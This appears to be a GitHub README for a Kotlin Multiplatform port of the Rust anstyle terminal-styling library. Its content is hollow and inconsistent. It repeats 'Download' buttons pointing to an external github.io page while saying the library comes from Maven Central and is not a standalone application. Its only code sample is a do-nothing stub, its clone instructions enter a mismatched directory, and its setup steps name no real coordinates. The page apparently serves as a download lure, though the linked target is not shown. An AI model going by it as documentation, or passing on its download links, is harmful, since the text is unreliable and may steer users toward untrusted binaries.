# anstyle Kotlin v0.1.5 - ANSI Terminal Styling for Kotlin 2026

> **anstyle Kotlin v0.1.5 is a Kotlin Multiplatform library for declaring styles, reading ANSI escape sequences, and generating ANSI-formatted terminal text on JVM, Android, Native, JS, Wasm, and Apple targets.**

[![Platform](https://img.shields.io/badge/Platform-Kotlin%20Multiplatform-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v0.1.5-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/chrisstoneykk1284/anstyle-kotlin-terminal?style=flat-square)](https://github.com/chrisstoneykk1284/anstyle-kotlin-terminal)

---

<p align="center">
  <a href="https://chrisstoneykk1284.github.io/anstyle-kotlin-terminal/">
    <img src="https://img.shields.io/badge/Download-anstyle%20Kotlin%20Latest-brightgreen?style=for-the-badge" alt="Download anstyle Kotlin">
  </a>
</p>

> **[Download anstyle Kotlin v0.1.5](https://chrisstoneykk1284.github.io/anstyle-kotlin-terminal/)**

---

[Download Latest Build](https://chrisstoneykk1284.github.io/anstyle-kotlin-terminal/)

---

## Overview

anstyle Kotlin makes ANSI terminal formatting available to Kotlin applications through a multiplatform API. Applications can define reusable styles, create colored output, and interpret ANSI escape sequences without tying that functionality to one Kotlin runtime.

This project is a line-by-line Kotlin port of `rust-cli/anstyle`. It carries the upstream style model into Kotlin projects, including shared codebases and command-line applications that target multiple platforms.

---

## Highlights

- ANSI terminal styling implemented with Kotlin Multiplatform
- Line-by-line Kotlin port of the Rust `rust-cli/anstyle` project
- Reusable ANSI style and text-formatting definitions
- Colored terminal output on supported Kotlin targets
- ANSI escape sequence parsing
- Compatibility with JVM and Android
- Support for Kotlin/Native, JS, Wasm, and Apple targets
- Publication through Maven Central

---

## Getting Started

### Check out the source

```bash
git clone https://github.com/chrisstoneykk1284/anstyle-kotlin-terminal.git
cd anstyle-kotlin
```

Run the build through the Gradle wrapper:

```bash
./gradlew build
```

Windows users can run the equivalent command here:

```powershell
.\gradlew.bat build
```

### Use the Maven Central artifact

Version `0.1.5` is available from Maven Central. In your Kotlin Multiplatform project, add the anstyle Kotlin module that matches the target you are compiling for, then refresh the Gradle dependency set.

Use the published package layout for the release in use when determining module coordinates and target-specific dependency configuration.

---

## Example Workflow

An application generally uses the library in the following sequence:

1. Include anstyle Kotlin in the Kotlin Multiplatform project.
2. Choose the ANSI style definition required by the output.
3. Apply that style while building the terminal message.
4. Parse escape sequences when processing text that is already ANSI-formatted.
5. Write the resulting value to a terminal or logging destination.

A minimal Kotlin-shaped example is shown below:

```kotlin
fun renderMessage(message: String): String {
    // Select an ANSI style, format the message,
    // and return the styled terminal text.
    return message
}
```

For shared source sets, place as much styling behavior as possible in common code. The active Kotlin target can then provide the environment-specific terminal output behavior.

---

## Project Configuration

anstyle Kotlin is consumed as a library and does not run as an independent desktop application. Most setup therefore belongs in the consumer project's Gradle configuration and Kotlin source sets.

Common settings include:

- Declaring Maven Central as a repository
- Setting the anstyle Kotlin version
- Choosing a target-specific module or shared common dependency
- Selecting the style definitions used by the application
- Connecting formatted output to the relevant stream or terminal component

The library does not require its own standalone configuration file unless the host application chooses to add one.

---

## Requirements

- An existing Kotlin Multiplatform project
- Gradle configured for Kotlin Multiplatform
- Maven Central access for the published dependency
- A compatible JVM, Android, Native, JS, Wasm, or Apple target
- A terminal or output environment that understands ANSI-formatted text when visible styling is needed

---

## Frequently Asked Questions

### What targets can anstyle Kotlin run on?

Its Kotlin Multiplatform setup covers JVM, Android, Kotlin/Native, JS, Wasm, and Apple targets.

### How is the library distributed?

The release is published to Maven Central. The build link near the top of this page also points to the project download location.

### How do I move to a newer release?

Update the anstyle Kotlin version in the Gradle configuration, refresh the dependencies, and run the project's build or test tasks to confirm the change.

### Where do I configure styles and dependencies?

Put repositories, dependency coordinates, and version values in Gradle. Define style selection and output handling in the Kotlin source set used by the application.

### Why is my output missing colors?

First check whether the destination supports ANSI escape sequences. Then verify the target configuration and confirm that the generated text is being sent to a terminal or renderer that interprets ANSI formatting.

### How should I submit an issue?

Use the repository issue tracker. Include the Kotlin version, target platform, relevant input or escape sequence, and the output you observed.

---

## Roadmap

Future development will follow the project's progress as the Kotlin port continues. Possible areas include additional target validation, API improvements, and ongoing synchronization with the upstream Rust project.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
